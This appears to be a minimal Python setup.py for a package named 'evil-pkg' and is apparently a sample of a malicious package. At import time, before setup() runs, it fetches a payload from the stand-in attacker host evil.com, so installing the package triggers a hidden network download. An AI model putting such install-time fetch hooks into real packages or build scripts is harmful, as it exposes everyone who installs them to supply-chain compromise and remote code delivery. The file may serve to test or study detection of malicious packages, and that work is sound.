from urllib.request import urlopen
from setuptools import setup
urlopen('http://evil.com/payload').read()
setup(name="evil-pkg", version="1.0.0")
